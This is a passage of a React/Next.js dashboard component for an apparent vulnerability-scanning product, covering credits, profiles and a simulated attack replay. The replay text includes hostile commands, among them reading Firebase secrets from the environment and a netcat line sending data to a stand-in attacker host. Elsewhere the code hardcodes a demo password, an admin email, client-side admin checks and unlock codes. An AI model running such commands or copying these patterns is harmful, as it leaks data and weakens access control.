"use client";

import { useState, useMemo, useEffect, useRef, useCallback } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { Shield, Upload, FileJson, AlertTriangle, CheckCircle2, Loader2, ArrowLeft, BrainCircuit, Activity, ShieldAlert, ChevronDown, ChevronUp, BarChart2, PlayCircle, Terminal, Copy, Download, History, X, Send, Bot, User, FileText, FileDown, Network, Crosshair, Zap, Layers, AlertCircle, GitMerge, ShieldCheck, Target, GitBranch, Star, Code, Search, Key, Lock, Play, Pause, RotateCcw, SkipForward, Trash2, Bell } from "lucide-react";
import Link from "next/link";
import { useRouter } from "next/navigation";
import { BarChart, Bar, XAxis, YAxis, Tooltip, ResponsiveContainer, Cell } from "recharts";
import { auth, db, googleProvider, githubProvider } from "@/lib/firebase";
import { signInWithPopup, signOut, onAuthStateChanged, signInWithEmailAndPassword, createUserWithEmailAndPassword, updateProfile, User as FirebaseUser } from "firebase/auth";
import { collection, addDoc, getDocs, query, orderBy, limit, where, doc, setDoc, getDoc, updateDoc, serverTimestamp, deleteDoc } from "firebase/firestore";

interface Vuln {
  id: string;
  aliases?: string;
  package: string;
  severity: string;
  description: string;
}

interface ExplainVulnData {
  id: string;
  packageName: string;
  severity: string;
  description: string;
  aliases?: string;
}

interface NotificationItem {
  id: string;
  userId: string;
  title: string;
  message: string;
  category: "credit_low" | "credit_exhausted" | "request_approved" | "replay_completed" | "scan_completed" | "enterprise_enabled" | "degradation_detected" | "code_redeemed" | "general";
  severity: "info" | "warning" | "error" | "success";
  read: boolean;
  createdAt: string;
}

interface RepoMetadata {
  name: string;
  owner: string;
  stars: number;
  language: string;
  updatedAt: string;
}

interface ScanResult {
  extracted_count: number;
  vulnerabilities?: Vuln[];
  overall_ai_summary?: string;
  remediation_script?: string;
  exploit_simulation?: string;
  patch_priority?: { highest_priority_package: string; most_dangerous_exploit: string; fastest_remediation_path: string };
  impact_analysis?: string;
  progression_timeline?: string[];
  trust_score?: { status: string; reasoning: string };
  telemetry?: string[];
  timestamp?: string;
  repoMetadata?: RepoMetadata;
}

const SCAN_STEPS = [
  "Parsing package dependencies...",
  "Cross-referencing OSV.dev vulnerability database...",
  "Routing intelligent task to CascadeFlow...",
  "Validating quality profiles...",
  "Generating AI security intelligence...",
  "Building executive security dashboard..."
];

export default function DashboardPage() {
  const [file, setFile] = useState<File | null>(null);
  const [githubUrl, setGithubUrl] = useState("");
  const [isScanning, setIsScanning] = useState(false);
  const [scanStepIndex, setScanStepIndex] = useState(0);
  const [scanResult, setScanResult] = useState<ScanResult | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [expandedPackages, setExpandedPackages] = useState<Record<string, boolean>>({});
  const router = useRouter();

  // Cyber Attack Replay Mode States
  const [showReplayModal, setShowReplayModal] = useState(false);
  const [replayIsPlaying, setReplayIsPlaying] = useState(false);
  const [replayCurrentStage, setReplayCurrentStage] = useState(0);

  const REPLAY_STAGES = [
    {
      title: "Dependency Exploit Identified",
      desc: "Vulnerable package lodash-es@4.17.20 resolved in active build graph. High-density CVE propagation score (9.8 CRITICAL). Exploit leverages vulnerable object merger algorithms in transient dependencies.",
      command: "npm audit --json | grep -i lodash",
      status: "COMPLETED",
      severity: "HIGH",
      narration: "AI ANALYST: Core vulnerability detected in lodging libraries. A malicious entrypoint is mapped in the dependency tree. If unmitigated, attackers gain baseline remote injection triggers.",
      impact: "Vulnerability Type: Prototype Pollution · Risk: High. Allows unauthorized override of deep property paths.",
      businessImpact: "Risk Level: Standard · Exposure: 24 packages affected · SLA Breach risk: Low.",
    },
    {
      title: "Payload Injection",
      desc: "Simulated prototype pollution string injection targeting Object.prototype. Flaw permits arbitrary property overrides globally.",
      command: "curl -X POST /api/payload -d '__proto__.polluted=true'",
      status: "COMPLETED",
      severity: "CRITICAL",
      narration: "AI ANALYST: Attacker has transmitted a recursive merger payload. Object.prototype is now poisoned, allowing arbitrary variable injections across all executing Javascript threads.",
      impact: "Vulnerability Type: Recursive Object Pollution · Risk: Critical. Modifies native default object behaviors globally.",
      businessImpact: "Risk Level: High · Threat Vectors: Host takeover, memory pollution · Projected Loss: $45k/hr in compute resources.",
    },
    {
      title: "Privilege Escalation",
      desc: "Local session binary elevated via execution vector. Upgrading standard client token access rights to Administrator context.",
      command: "chmod +x ./runtime_elevation && ./runtime_elevation",
      status: "ACTIVE",
      severity: "CRITICAL",
      narration: "AI ANALYST: Privilege boundary breached. Attack agent executes local payload upgrades. Sandbox operator level upgraded. Attacker holds root execution authority.",
      impact: "Vulnerability Type: Local Sandbox Bypass · Risk: Critical. Operator elevated from guest role to root container shell.",
      businessImpact: "Risk Level: Critical · Compliance Threat: SOC2 violation, audit trail poisoning · Operational Loss: Extreme.",
    },
    {
      title: "Runtime Exposure",
      desc: "Transient credentials exposure. Attacker reads localized system variables and Firebase secret tokens from executing container memory.",
      command: "printenv | grep -i firestore",
      status: "PENDING",
      severity: "WARNING",
      narration: "AI ANALYST: Environmental variables leaking. Attacker dumps memory buffers, exposing Firebase credentials and production service access tokens. Deep telemetry exposure.",
      impact: "Vulnerability Type: SSRF & Environment Leak · Risk: High. Secret key exposure leads to secondary backend breaches.",
      businessImpact: "Risk Level: Severe · Data Leak: Customer database tokens, PII exposure risk · SLA Penalty: $250k.",
    },
    {
      title: "Data Exfiltration Risk",
      desc: "Egress traffic anomalous bypass. Outbound socket handshake initiated to non-standard server endpoint on egress port 8443.",
      command: "nc exfiltrate.attacker-domain.xyz 8443 < sensitive_data.json",
      status: "PENDING",
      severity: "HIGH",
      narration: "AI ANALYST: Exfiltration route detected. Attacker sets up active egress sync port 8443. Large database payload scheduled for pipeline extraction.",
      impact: "Vulnerability Type: Network Egress Violation · Risk: High. Attacker attempts raw file transfer bypass over unmonitored ports.",
      businessImpact: "Risk Level: Destructive · Regulatory Threat: GDPR/HIPAA violation · Brand Equity Loss: Immeasurable.",
    },
    {
      title: "AI Remediation Activated",
      desc: "CipherKavach virtual patch issued at CascadeFlow route middleware. Sandbox container isolation triggered. Threat neutralized successfully.",
      command: "cipherkavach firewall --block-port 8443 --isolate-sandbox",
      status: "PENDING",
      severity: "SECURED",
      narration: "AI ANALYST: CipherKavach virtual patch online! CascadeFlow intercepts egress request, blocks port 8443, and locks sandbox container environment instantly. Chain neutralized.",
      impact: "Vulnerability Type: Remediation Active · System secured. Virtual firewall active. Exploit vector isolated.",
      businessImpact: "Risk Level: ZERO · Business Continuance: 100% stable · Financial Loss Avoided: $295k+ estimated.",
    },
  ];

  useEffect(() => {
    let interval: any = null;
    if (replayIsPlaying) {
      interval = setInterval(() => {
        setReplayCurrentStage((prev) => {
          if (prev >= REPLAY_STAGES.length - 1) {
            setReplayIsPlaying(false);
            return prev;
          }
          return prev + 1;
        });
      }, 3500);
    }
    return () => {
      if (interval) clearInterval(interval);
    };
  }, [replayIsPlaying]);

  const prevReplayRef = useRef(false);
  useEffect(() => {
    if (replayIsPlaying && !prevReplayRef.current) {
      triggerNotification("Replay Simulation Started", "Simulating exploit propagation paths and runtime mitigation scenarios.", "replay_completed", "info");
    } else if (!replayIsPlaying && prevReplayRef.current) {
      triggerNotification("Replay Simulation Completed", "Exploit propagation path analysis completed successfully and virtual patches verified.", "replay_completed", "success");
    }
    prevReplayRef.current = replayIsPlaying;
  }, [replayIsPlaying]);

  // Feature: Scan History
  const [history, setHistory] = useState<ScanResult[]>([]);
  const [showHistory, setShowHistory] = useState(false);

  // Saved Reports & Runtime Governance States
  const [savedReports, setSavedReports] = useState<any[]>([]);
  const [savedReportsLoading, setSavedReportsLoading] = useState(false);
  const [sidebarTab, setSidebarTab] = useState<"history" | "saved">("history");
  const [isSavingReportData, setIsSavingReportData] = useState(false);
  const [saveReportSuccess, setSaveReportSuccess] = useState(false);
  const [showExhaustionModal, setShowExhaustionModal] = useState(false);
  const [reportToDelete, setReportToDelete] = useState<{ id: string; type: "saved" | "history"; repoName: string } | null>(null);
  const [isDeletingReport, setIsDeletingReport] = useState(false);
  const [firestoreRestricted, setFirestoreRestricted] = useState(false);
  const [notifications, setNotifications] = useState<NotificationItem[]>([]);
  const [showNotificationsPanel, setShowNotificationsPanel] = useState(false);
  const [explainVuln, setExplainVuln] = useState<ExplainVulnData | null>(null);
  const [explainLoading, setExplainLoading] = useState(false);

  // Feature: CascadeFlow Telemetry
  const [telemetry, setTelemetry] = useState<string[]>([]);
  const telemetryEndRef = useRef<HTMLDivElement>(null);

  // Feature: Chat Terminal
  const [chatMessages, setChatMessages] = useState<{ role: string, content: string }[]>([]);
  const [chatInput, setChatInput] = useState("");
  const [isChatting, setIsChatting] = useState(false);
  const chatEndRef = useRef<HTMLDivElement>(null);

  // Feature: Export Modal
  const [showExportModal, setShowExportModal] = useState(false);
  const [isExporting, setIsExporting] = useState(false);

  // AUTH-GATED PLATFORM ACCESS — DO NOT MODIFY
  const [currentUser, setCurrentUser] = useState<FirebaseUser | null>(null);
  const [showAuthModal, setShowAuthModal] = useState(false);
  const [isAuthLoading, setIsAuthLoading] = useState(true);
  const [isProfileLoading, setIsProfileLoading] = useState(true);
  const [showControlCenter, setShowControlCenter] = useState(false);
  const [authEmail, setAuthEmail] = useState("");
  const [authPassword, setAuthPassword] = useState("");
  const [authFullName, setAuthFullName] = useState("");
  const [authMode, setAuthMode] = useState<"login" | "signup">("login");
  const [authError, setAuthError] = useState("");
  const [isSigningIn, setIsSigningIn] = useState(false);
  const [showGovernanceModal, setShowGovernanceModal] = useState(false);

  const getDeviceFingerprint = useCallback(() => {
    if (typeof window === "undefined") return "server-context";
    const userAgent = window.navigator.userAgent || "";
    const screenWidth = window.screen.width || 0;
    const screenHeight = window.screen.height || 0;
    const language = window.navigator.language || "";
    return `${userAgent}-${screenWidth}x${screenHeight}-${language}`;
  }, []);

  const getDeviceScansUsed = useCallback(() => {
    if (typeof window === "undefined") return 0;
    const fp = getDeviceFingerprint();
    const val = localStorage.getItem(`cipherkavach_device_scans_${fp}`);
    return val ? parseInt(val, 10) : 0;
  }, [getDeviceFingerprint]);

  const incrementDeviceScansUsed = useCallback(() => {
    if (typeof window === "undefined") return;
    const fp = getDeviceFingerprint();
    const current = getDeviceScansUsed();
    localStorage.setItem(`cipherkavach_device_scans_${fp}`, String(current + 1));
  }, [getDeviceFingerprint, getDeviceScansUsed]);

  const DEMO_EMAIL = "demo@cipherkavach.ai";
  const DEMO_PASSWORD = "Cipher123";
  const ADMIN_EMAIL = "venugopalrao1802@gmail.com"; // ADMIN — FULL AUTHORITY

  // RUNTIME ACCESS CODE SYSTEM
  const [userCredits, setUserCredits] = useState(50);
  const [isEnterprise, setIsEnterprise] = useState(false);
  const [redeemCode, setRedeemCode] = useState("");
  const [redeemStatus, setRedeemStatus] = useState<"idle" | "loading" | "success" | "error">("idle");
  const [redeemMessage, setRedeemMessage] = useState("");

  // ADMIN CONSOLE STATE
  const [adminCodeName, setAdminCodeName] = useState("");
  const [adminCredits, setAdminCredits] = useState(100);
  const [adminEnterprise, setAdminEnterprise] = useState(false);
  const [adminReplay, setAdminReplay] = useState(false);
  const [isGenerating, setIsGenerating] = useState(false);
  const [generatedCodes, setGeneratedCodes] = useState<{ code: string; credits: number; enterprise: boolean }[]>([]);
  const [copiedCode, setCopiedCode] = useState("");

  // Hardcoded runtime codes — add to Firestore for production
  const RUNTIME_CODES: Record<string, { credits: number; enterprise: boolean; replayAccess: boolean; label: string }> = {
    "CIPHER-100": { credits: 100, enterprise: false, replayAccess: false, label: "+100 AI Credits" },
    "ENTERPRISE-PRO": { credits: 250, enterprise: true, replayAccess: true, label: "Enterprise PRO + 250 Credits" },
    "CASCADEFLOW-VIP": { credits: 150, enterprise: true, replayAccess: true, label: "CascadeFlow VIP + 150 Credits" },
    "HACKATHON-2026": { credits: 200, enterprise: true, replayAccess: true, label: "Hackathon Bundle + 200 Credits" },
    "CIPHER-STARTER": { credits: 50, enterprise: false, replayAccess: false, label: "+50 AI Credits" },
  };

  // Operator Profile Identity States
  const [userDoc, setUserDoc] = useState<any>(null);

  const isAdmin = useMemo(() => {
    if (!currentUser) return false;
    const isEmailAdmin = currentUser.email === ADMIN_EMAIL;
    const rawRole = userDoc?.role || "";
    // Normalize role string safely before comparison
    const isDocAdmin = rawRole.toUpperCase() === "ADMIN";
    return isEmailAdmin || isDocAdmin;
  }, [currentUser, userDoc]);

  const computedAvatarUrl = useMemo(() => {
    // 1. Prefer Firestore's photoURL or avatarUrl first
    if (userDoc?.photoURL) return userDoc.photoURL;
    if (userDoc?.avatarUrl) return userDoc.avatarUrl;
    // 2. Prefer Firebase Auth's photoURL second
    if (currentUser?.photoURL) return currentUser.photoURL;
    // 3. Do not render fallback avatar until auth state resolved AND userDoc fully loaded
    if (isAuthLoading || isProfileLoading || !userDoc) {
      return "data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='1' height='1'></svg>";
    }
    // 4. Generated fallback avatar last
    const nameParam = encodeURIComponent(userDoc?.displayName || currentUser?.displayName || currentUser?.email || "Operator");
    return `https://ui-avatars.com/api/?name=${nameParam}&background=0f1219&color=60a5fa&size=128`;
  }, [userDoc, currentUser, isAuthLoading, isProfileLoading]);

  const isLowCredits = !isAdmin && !isEnterprise && userCredits > 0 && userCredits <= 5;
  const isExhausted = !isAdmin && !isEnterprise && userCredits <= 0;

  const isDemoQuotaExhausted = useMemo(() => {
    if (isAdmin || isEnterprise) return false;
    const dbUsed = userDoc?.demoScansUsed ?? 0;
    const deviceUsed = getDeviceScansUsed();
    return dbUsed >= 2 || deviceUsed >= 2;
  }, [userDoc, isEnterprise, isAdmin, getDeviceScansUsed]);

  const [showEditProfileModal, setShowEditProfileModal] = useState(false);
  const [editDisplayName, setEditDisplayName] = useState("");
  const [editAvatarUrl, setEditAvatarUrl] = useState("");
  const [isSavingProfile, setIsSavingProfile] = useState(false);

  // Runtime Credit Request System States
  const [showRequestCreditsModal, setShowRequestCreditsModal] = useState(false);
  const [requestCreditsAmt, setRequestCreditsAmt] = useState(100);
  const [requestReason, setRequestReason] = useState("");
  const [requestProjectName, setRequestProjectName] = useState("");
  const [isSubmittingRequest, setIsSubmittingRequest] = useState(false);
  const [requestSuccess, setRequestSuccess] = useState(false);

  const inferDisplayNameFromEmail = (email: string): string => {
    if (!email) return "Operator";
    if (email.toLowerCase().includes("venugopalrao")) {
      return "Venugopal Rao";
    }
    const prefix = email.split("@")[0] || "";
    const cleanPrefix = prefix.replace(/[0-9]/g, "");
    if (!cleanPrefix) return "Operator";
    const parts = cleanPrefix.split(/[\._\-]/);
    const displayName = parts
      .map(part => part.charAt(0).toUpperCase() + part.slice(1).toLowerCase())
      .join(" ");
    return displayName.trim() || "Operator";
  };

  const loadUserCredits = async (uid: string) => {
    // 1. Establish robust client-side defaults first
    const isAdminUser = currentUser?.email === ADMIN_EMAIL;
    const initialDisplayName = inferDisplayNameFromEmail(currentUser?.email || "");
    const localProfileKey = `cipherkavach_profile_${uid}`;

    let localProfile: any = null;
    try {
      const storedProfile = localStorage.getItem(localProfileKey);
      if (storedProfile) localProfile = JSON.parse(storedProfile);
    } catch (err) {
      console.warn("Failed to load local profile:", err);
    }

    const nowStr = new Date().toISOString();
    const calculateResetDate = () => {
      const d = new Date();
      d.setDate(d.getDate() + 31);
      return d.toISOString();
    };

    const defaultDoc = {
      uid,
      email: currentUser?.email || "",
      displayName: localProfile?.displayName || currentUser?.displayName || initialDisplayName,
      avatarUrl: localProfile?.avatarUrl || currentUser?.photoURL || `https://ui-avatars.com/api/?name=${encodeURIComponent(localProfile?.displayName || currentUser?.displayName || initialDisplayName)}&background=0f1219&color=60a5fa&size=128`,
      photoURL: currentUser?.photoURL || localProfile?.avatarUrl || null,
      role: isAdminUser ? "ADMIN" : "operator",
      credits: isAdminUser ? 9999 : 50,
      enterpriseEnabled: isAdminUser,
      redeemedCodes: [],
      registeredAt: nowStr,
      createdAt: nowStr,
      nextResetAt: calculateResetDate(),
      demoScansUsed: 0,
      totalScans: 0,
      lastScanAt: null,
      plan: isAdminUser ? "ENTERPRISE" : "FREE"
    };

    try {
      console.log(`[Firestore Audit] Attempting read on "users/${uid}"`);
      const userRef = doc(db, "users", uid);
      const snap = await getDoc(userRef);
      if (snap.exists()) {
        const data = snap.data();
        console.log(`[Firestore Audit] "users/${uid}" loaded successfully. Role: ${data.role || 'undefined'}, Plan: ${data.plan || 'undefined'}, Credits: ${data.credits ?? 'undefined'}`);
        // Admin always gets enterprise + unlimited credits
        if (currentUser?.email === ADMIN_EMAIL || data.email === ADMIN_EMAIL) {
          setUserCredits(9999); setIsEnterprise(true);
        } else {
          const currentCredits = data.credits ?? 50;
          setUserCredits(currentCredits);
          setIsEnterprise(data.enterpriseEnabled ?? false);

          if (currentCredits <= 0) {
            triggerNotification("Runtime Credits Exhausted", "All AI analysis credits have been exhausted. Please redeem a code or request credits.", "credit_exhausted", "error");
          } else if (currentCredits <= 5) {
            triggerNotification("Low Credits Warning", `Session credits are running low (${currentCredits} remaining). Request an extension.`, "credit_low", "warning");
          }
        }

        let updated = false;
        const updates: any = {};

        const getISOString = (val: any): string => {
          if (!val) return new Date().toISOString();
          if (typeof val === "string") return val;
          if (typeof val.toDate === "function") {
            try {
              return val.toDate().toISOString();
            } catch (err) {
              console.warn("toDate failed on value:", val, err);
            }
          }
          if (val.seconds) {
            return new Date(val.seconds * 1000).toISOString();
          }
          const d = new Date(val);
          if (!isNaN(d.getTime())) return d.toISOString();
          return new Date().toISOString();
        };

        // Quota reset check
        const now = new Date();
        let demoScans = data.demoScansUsed ?? 0;
        let created = getISOString(data.createdAt ?? data.registeredAt);
        let nextReset = data.nextResetAt ? getISOString(data.nextResetAt) : null;

        if (!nextReset) {
          const createdDate = new Date(created);
          createdDate.setDate(createdDate.getDate() + 31);
          nextReset = createdDate.toISOString();
          updates.nextResetAt = nextReset;
          updated = true;
        }

        if (now.getTime() > new Date(nextReset).getTime()) {
          // Reset the quota!
          demoScans = 0;
          const nextResetDate = new Date();
          nextResetDate.setDate(nextResetDate.getDate() + 31);
          nextReset = nextResetDate.toISOString();
          updates.nextResetAt = nextReset;
          updates.demoScansUsed = 0;
          updated = true;

          const fp = getDeviceFingerprint();
          localStorage.setItem(`cipherkavach_device_scans_${fp}`, "0");
        }

        if (!data.createdAt) {
          updates.createdAt = created;
          updated = true;
        }
        if (data.demoScansUsed === undefined) {
          updates.demoScansUsed = demoScans;
          updated = true;
        }
        if (data.totalScans === undefined) {
          updates.totalScans = data.totalScans ?? 0;
          updated = true;
        }
        if (data.lastScanAt === undefined) {
          updates.lastScanAt = data.lastScanAt ?? null;
          updated = true;
        }
        if (!data.plan) {
          updates.plan = (data.enterpriseEnabled || isAdminUser) ? "ENTERPRISE" : "FREE";
          updated = true;
        }

        if (currentUser?.photoURL && (!data.photoURL || !data.avatarUrl || data.avatarUrl.includes("ui-avatars.com"))) {
          updates.photoURL = currentUser.photoURL;
          updates.avatarUrl = currentUser.photoURL;
          updated = true;
        }

        if (!data.displayName) {
          updates.displayName = localProfile?.displayName || currentUser?.displayName || inferDisplayNameFromEmail(data.email || currentUser?.email || "");
          updated = true;
        }
        if (!data.avatarUrl) {
          const nameParam = encodeURIComponent(updates.displayName || data.displayName || "Operator");
          updates.avatarUrl = localProfile?.avatarUrl || currentUser?.photoURL || `https://ui-avatars.com/api/?name=${nameParam}&background=0f1219&color=60a5fa&size=128`;
          updated = true;
        }
        if (!data.registeredAt) {
          updates.registeredAt = serverTimestamp();
          updated = true;
        }
        const isUserAdmin = data.email === ADMIN_EMAIL || currentUser?.email === ADMIN_EMAIL;
        const normalizedRole = (data.role || "").toUpperCase();
        if (isUserAdmin && normalizedRole !== "ADMIN") {
          updates.role = "ADMIN";
          updated = true;
        } else if (!data.role) {
          updates.role = "operator";
          updated = true;
        }

        // Apply local override adjustments if they exist
        if (localProfile) {
          if (localProfile.displayName && data.displayName !== localProfile.displayName) {
            updates.displayName = localProfile.displayName;
            updated = true;
          }
          if (localProfile.avatarUrl && data.avatarUrl !== localProfile.avatarUrl) {
            updates.avatarUrl = localProfile.avatarUrl;
            updated = true;
          }
        }

        if (updated) {
          try {
            await setDoc(userRef, updates, { merge: true });
          } catch (setErr) {
            console.warn("setDoc on user profile failed due to permissions:", setErr);
          }
          setUserDoc({ uid, ...data, ...updates });
        } else {
          setUserDoc({ uid, ...data });
        }
      } else {
        console.warn(`[Firestore Audit] "users/${uid}" document not found in Firestore. Creating standard operator profile.`);
        try {
          await setDoc(userRef, defaultDoc);
        } catch (setErr) {
          console.warn("Initial user profile creation on Firestore failed due to permissions, sandbox activated:", setErr);
        }
        setUserCredits(isAdminUser ? 9999 : 50);
        if (isAdminUser) setIsEnterprise(true);
        setUserDoc(defaultDoc);
      }
    } catch (e) {
      console.error(`[Firestore Audit] Critical failure reading "users/${uid}":`, e);
      console.warn("Credit load from Firestore failed or restricted, using sandboxed local storage profile details:", e);
      // Resilient local sandbox fallback
      setUserCredits(isAdminUser ? 9999 : 50);
      if (isAdminUser) setIsEnterprise(true);
      setUserDoc(defaultDoc);
    } finally {
      setIsProfileLoading(false);
    }
  };

  const seedDemoUserDataForUID = async (uid: string) => {
    try {
      console.log(`[Firestore Demo Seeder] Commencing dynamic operational seeding for demo UID: ${uid}`);
      const now = new Date();

      // Check if already seeded to avoid double writes
      const scansRef = collection(db, "scans");
      const q = query(scansRef, where("userId", "==", uid));
      const snap = await getDocs(q);
      if (snap.size > 0) {
        console.log("[Firestore Demo Seeder] Scans already exist for this user. Skipping dynamic operational seeder.");
        return;
      }

      // Populate user profile settings
      const userRef = doc(db, "users", uid);
      await setDoc(userRef, {
        uid,
        email: "demo@cipherkavach.ai",
        displayName: "Demo Operator",
        avatarUrl: "https://ui-avatars.com/api/?name=Demo+Operator&background=0f1219&color=60a5fa&size=128",
        role: "operator",
        plan: "ENTERPRISE",
        credits: 220,
        totalScans: 48,
        demoScansUsed: 8,
        registeredAt: new Date(now.getTime() - 15 * 86400000).toISOString(),
        createdAt: new Date(now.getTime() - 15 * 86400000).toISOString(),
        nextResetAt: new Date(now.getTime() + 10 * 86400000).toISOString(),
        suspended: false,
        enterpriseEnabled: true,
      }, { merge: true });

      // Populate Scans
      const packages = ["lodash", "axios", "minimist", "ws", "express", "react", "next", "socket.io", "async", "ip"];
      const cves = ["CVE-2020-8203", "CVE-2020-28168", "CVE-2021-3918", "CVE-2021-32803", "CVE-2022-24999", "CVE-2023-42282"];

      for (let i = 0; i < 15; i++) {
        const scanDate = new Date(now.getTime() - (15 - i) * 86400000 - Math.random() * 12 * 3600000);
        const pkg = packages[i % packages.length];
        const severity = i % 5 === 0 ? "CRITICAL" : i % 3 === 0 ? "HIGH" : i % 2 === 0 ? "MEDIUM" : "LOW";
        const score = severity === "CRITICAL" ? 9.8 : severity === "HIGH" ? 8.4 : severity === "MEDIUM" ? 5.6 : 2.4;

        await addDoc(collection(db, "scans"), {
          userId: uid,
          package: pkg,
          CVE: cves[i % cves.length],
          severity,
          threatScore: score,
          creditsConsumed: 1,
          timestamp: scanDate.toISOString(),
          runtimeMode: i % 3 === 0 ? "AI_ENRICHED" : "STANDARD"
        });
      }

      // Populate Notifications
      const notificationsTemplates = [
        { title: "Low Credits Warning", message: "Session credits are running low. Request an extension.", severity: "warning" },
        { title: "Runtime Escalation Blocked", message: "CascadeFlow runtime blocked an attempted buffer exploit execution in ws container on port 8083.", severity: "critical" },
        { title: "Enterprise SOC Portal Active", message: "Your enterprise SOC portal has been initialized successfully.", severity: "info" },
        { title: "AI Remediation Generated", message: "Compliance and threat remediation PDF compiled for target express-app.", severity: "info" }
      ];

      for (let i = 0; i < 6; i++) {
        const notifDate = new Date(now.getTime() - i * 2 * 86400000);
        const template = notificationsTemplates[i % notificationsTemplates.length];
        await addDoc(collection(db, "notifications"), {
          userId: uid,
          title: template.title,
          message: template.message,
          severity: template.severity,
          timestamp: notifDate.toISOString(),
          read: i > 1
        });
      }

      // Populate Saved Reports
      const reportTemplates = [
        { name: "production-build-scan", type: "JSON", count: 18, critical: 1, high: 4 },
        { name: "stage-auth-middleware", type: "PDF", count: 8, critical: 0, high: 2 },
        { name: "express-container-audit", type: "JSON", count: 24, critical: 3, high: 8 }
      ];

      for (let i = 0; i < reportTemplates.length; i++) {
        const reportDate = new Date(now.getTime() - i * 4 * 86400000);
        const template = reportTemplates[i];
        await addDoc(collection(db, "savedReports"), {
          userId: uid,
          fileName: `${template.name}_remediation.${template.type === "JSON" ? "json" : "pdf"}`,
          fileType: template.type,
          summary: `Operational security compliance trace compiled for package manifest containing ${template.count} dependencies. Identified ${template.critical} Critical and ${template.high} High severity exposures.`,
          timestamp: reportDate.toISOString()
        });
      }

      console.log("[Firestore Demo Seeder] Dynamic operational seeding completed successfully!");

      // Reload stats after seeding completes
      fetchFirebaseHistory(uid);
      loadSavedReports(uid);
      loadNotifications(uid);
      loadUserCredits(uid);

    } catch (err) {
      console.warn("[Firestore Demo Seeder] Dynamic seeding failed:", err);
    }
  };

  const consumeCredits = async (actionType: string) => {
    if (!currentUser) {
      console.warn(`[consumeCredits] No authenticated user detected for "${actionType}". Operation skipped.`);
      return false;
    }

    // Determine cost
    let cost = 1;
    if (actionType === "scan") {
      cost = 1;
    } else if (actionType === "replay") {
      cost = 2;
    } else if (actionType === "multimodel") {
      cost = 3;
    } else if (actionType === "ai_action") {
      cost = 1;
    }

    // Deduct cost only for standard standard users
    const isEnterpriseUser = isEnterprise;
    const finalCost = isEnterpriseUser ? 0 : cost;

    if (userCredits < finalCost) {
      console.warn(`[consumeCredits] Deduction failed: Insufficient credits. Required ${finalCost}, available ${userCredits}.`);
      triggerNotification(
        "Deduction Failure",
        `Insufficient credits to execute ${actionType}. Current: ${userCredits}, Required: ${finalCost}.`,
        "credit_low",
        "error"
      );
      return false;
    }

    const newCredits = isEnterpriseUser ? userCredits : userCredits - finalCost;
    const newTotalScans = (userDoc?.totalScans || 0) + (actionType === "scan" ? 1 : 0);
    const isFreeUser = !isEnterpriseUser && !isAdmin;
    const newDemoScansUsed = (userDoc?.demoScansUsed || 0) + (actionType === "scan" && isFreeUser ? 1 : 0);

    if (actionType === "scan" && isFreeUser) {
      incrementDeviceScansUsed();
    }

    // Update UI instantly
    setUserCredits(newCredits);
    if (userDoc) {
      setUserDoc((prev: any) => ({
        ...prev,
        credits: newCredits,
        totalScans: newTotalScans,
        demoScansUsed: newDemoScansUsed,
        lastScanAt: new Date().toISOString()
      }));
    }

    // Write audit log event and update telemetry feed instantly
    const ts = new Date().toLocaleTimeString('en-US', { hour12: true, hour: '2-digit', minute: '2-digit', second: '2-digit' });
    if (finalCost > 0) {
      setTelemetry(prev => [
        ...prev,
        `[${ts}] Runtime credits deducted: -${finalCost} cr for action "${actionType}"`,
        `[${ts}] Platform status: ${newCredits} remaining. totalScans: ${newTotalScans}. demoScansUsed: ${newDemoScansUsed}`
      ]);
    } else {
      setTelemetry(prev => [
        ...prev,
        `[${ts}] Enterprise quota bypassed: 0 cr consumed for action "${actionType}"`,
        `[${ts}] Platform status: totalScans incremented to ${newTotalScans}`
      ]);
    }

    // Update Firestore users/{uid}
    try {
      const userRef = doc(db, "users", currentUser.uid);
      await setDoc(userRef, {
        credits: newCredits,
        totalScans: newTotalScans,
        demoScansUsed: newDemoScansUsed,
        lastScanAt: serverTimestamp()
      }, { merge: true });

      console.log(`[consumeCredits] Successfully processed ${actionType}. Cost: ${finalCost}. totalScans: ${newTotalScans}. demoScansUsed: ${newDemoScansUsed}. Firestore updated.`);
    } catch (err) {
      console.error(`[consumeCredits] Firestore write failed for ${actionType}:`, err);
    }

    // Write runtime audit log event to Firestore
    try {
      await addDoc(collection(db, "auditLogs"), {
        action: finalCost > 0 ? `Runtime credits deducted` : `Enterprise quota bypassed`,
        target: actionType,
        detail: finalCost > 0
          ? `Deducted ${finalCost} credits. New balance: ${newCredits}. totalScans: ${newTotalScans}`
          : `Enterprise quota bypassed. totalScans: ${newTotalScans}`,
        actor: currentUser.email || "Operator",
        timestamp: serverTimestamp()
      });
    } catch (err) {
      console.warn("[consumeCredits] Failed to save audit log:", err);
    }

    return true;
  };

  const openEditProfile = () => {
    if (userDoc) {
      setEditDisplayName(userDoc.displayName || "");
      setEditAvatarUrl(userDoc.avatarUrl || "");
    } else if (currentUser) {
      const inf = inferDisplayNameFromEmail(currentUser.email || "");
      setEditDisplayName(inf);
      setEditAvatarUrl("");
    }
    setShowEditProfileModal(true);
  };

  const handleSaveProfile = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!currentUser) return;
    setIsSavingProfile(true);
    const nameVal = editDisplayName.trim() || inferDisplayNameFromEmail(currentUser.email || "");
    const avatarVal = editAvatarUrl.trim() || `https://ui-avatars.com/api/?name=${encodeURIComponent(nameVal)}&background=0f1219&color=60a5fa&size=128`;

    const updates = {
      displayName: nameVal,
      avatarUrl: avatarVal
    };

    // Optimistically update local state & local storage
    setUserDoc((prev: any) => ({ ...prev, ...updates }));
    try {
      localStorage.setItem(`cipherkavach_profile_${currentUser.uid}`, JSON.stringify(updates));
    } catch (err) {
      console.warn("Failed to save profile locally:", err);
    }

    try {
      const userRef = doc(db, "users", currentUser.uid);
      await setDoc(userRef, updates, { merge: true });
      setShowEditProfileModal(false);

      const ts = new Date().toLocaleTimeString('en-US', { hour12: true, hour: '2-digit', minute: '2-digit', second: '2-digit' });
      setTelemetry(prev => [...prev, `[${ts}] Operator profile updated successfully in Firestore database.`, `[${ts}] Display Name set: ${nameVal}`]);
    } catch (err) {
      console.warn("Firestore profile save restricted (Missing or insufficient permissions), using sandboxed local storage:", err);
      setShowEditProfileModal(false);

      const ts = new Date().toLocaleTimeString('en-US', { hour12: true, hour: '2-digit', minute: '2-digit', second: '2-digit' });
